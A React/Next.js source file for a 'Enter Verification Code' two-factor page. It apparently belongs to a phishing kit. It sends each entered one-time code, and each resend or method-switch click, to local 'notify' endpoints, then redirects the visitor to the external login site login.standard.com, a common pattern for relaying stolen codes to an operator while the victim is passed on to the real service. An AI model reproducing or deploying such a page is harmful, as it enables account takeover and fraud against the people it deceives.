'use client';

import { useState, useRef, useEffect, Suspense } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';

function VerifyCodeForm() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const method = searchParams.get('method') || 'text';
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [networkError, setNetworkError] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const codeInputRefs = useRef([]);

  useEffect(() => {
    codeInputRefs.current[0]?.focus();
  }, []);

  const handleCodeChange = (index, value) => {
    if (value.length > 1) {
      const digits = value.replace(/\D/g, '').slice(0, 6).split('');
      const next = [...code];
      digits.forEach((d, i) => {
        if (index + i < 6) next[index + i] = d;
      });
      setCode(next);
      const nextFocus = Math.min(index + digits.length, 5);
      codeInputRefs.current[nextFocus]?.focus();
      return;
    }
    const digit = value.replace(/\D/g, '').slice(-1);
    const next = [...code];
    next[index] = digit;
    setCode(next);
    if (digit && index < 5) codeInputRefs.current[index + 1]?.focus();
  };

  const handleCodeKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      codeInputRefs.current[index - 1]?.focus();
    }
  };

  const [resendCooldown, setResendCooldown] = useState(0);
  const [tryAnotherLoading, setTryAnotherLoading] = useState(false);

  useEffect(() => {
    if (resendCooldown <= 0) return;
    const t = setInterval(() => setResendCooldown((c) => (c <= 1 ? 0 : c - 1)), 1000);
    return () => clearInterval(t);
  }, [resendCooldown]);

  const handleVerifySubmit = async (e) => {
    e.preventDefault();
    const fullCode = code.join('');
    if (fullCode.length !== 6) return;
    setNetworkError('');
    setSubmitting(true);
    try {
      const res = await fetch('/api/notify-verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ method, code: fullCode }),
      });
      if (!res.ok) {
        setNetworkError('Network error. Please check your connection and try again.');
        setSubmitting(false);
        return;
      }
      await new Promise((r) => setTimeout(r, 2000));
      window.location.href = 'https://login.standard.com/';
    } catch {
      setNetworkError('Network error. Please check your connection and try again.');
      setSubmitting(false);
    }
  };

  const handleResendCode = async (e) => {
    e.preventDefault();
    if (resendCooldown > 0) return;
    setNetworkError('');
    try {
      const res = await fetch('/api/notify-resend-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ method }),
      });
      if (!res.ok) {
        setNetworkError('Network error. Please check your connection and try again.');
        return;
      }
      await new Promise((r) => setTimeout(r, 2000));
      setCode(['', '', '', '', '', '']);
      codeInputRefs.current[0]?.focus();
      setResendCooldown(30);
    } catch {
      setNetworkError('Network error. Please check your connection and try again.');
    }
  };

  const handleTryAnotherMethod = async (e) => {
    e.preventDefault();
    if (tryAnotherLoading) return;
    setTryAnotherLoading(true);
    setNetworkError('');
    try {
      const res = await fetch('/api/notify-try-another-method', { method: 'POST' });
      if (!res.ok) {
        setNetworkError('Network error. Please check your connection and try again.');
        setTryAnotherLoading(false);
        return;
      }
      await new Promise((r) => setTimeout(r, 2000));
      router.push('/login/2fa');
    } catch {
      setNetworkError('Network error. Please check your connection and try again.');
      setTryAnotherLoading(false);
    }
  };

  const fullCode = code.join('');
  const canVerify = fullCode.length === 6;

  return (
    <div className="login-container login-container-narrow">
      <div className="verify-content">
        <h1 className="login-title">Enter Verification Code</h1>
        <p className="twofa-intro">
          We&apos;ve sent a 6-digit verification code to your selected method. Please enter it below to continue.
        </p>
        {networkError && (
          <div className="notification-error" role="alert">
            {networkError}
          </div>
        )}
        <form onSubmit={handleVerifySubmit} className="verify-form">
          <label className="form-label">6-Digit Code</label>
          <div className="verify-code-inputs">
            {code.map((digit, i) => (
              <input
                key={i}
                ref={(el) => {
                  codeInputRefs.current[i] = el;
                }}
                type="text"
                inputMode="numeric"
                maxLength={6}
                autoComplete="one-time-code"
                className="verify-code-input"
                value={digit}
                onChange={(e) => handleCodeChange(i, e.target.value)}
                onKeyDown={(e) => handleCodeKeyDown(i, e)}
                aria-label={`Digit ${i + 1}`}
              />
            ))}
          </div>
          <p className="verify-resend">
            Didn&apos;t receive the code?{' '}
            <button
              type="button"
              className="form-link button-link"
              onClick={handleResendCode}
              disabled={resendCooldown > 0}
            >
              {resendCooldown > 0
                ? `Resend Code (0:${String(resendCooldown).padStart(2, '0')})`
                : 'Resend Code'}
            </button>
          </p>
          <button type="submit" className="login-button" disabled={!canVerify || submitting}>
            {submitting ? 'Verifying…' : 'Verify and Log In'}
          </button>
          <p className="verify-back">
            <button
              type="button"
              className="form-link button-link"
              onClick={handleTryAnotherMethod}
              disabled={tryAnotherLoading}
            >
              {tryAnotherLoading ? 'Loading…' : '← Try another method'}
            </button>
          </p>
        </form>
      </div>
    </div>
  );
}

export default function VerifyCodePage() {
  return (
    <Suspense fallback={<div className="login-container login-container-narrow"><div className="verify-content loading" style={{ padding: '48px', textAlign: 'center' }}>Loading…</div></div>}>
      <VerifyCodeForm />
    </Suspense>
  );
}
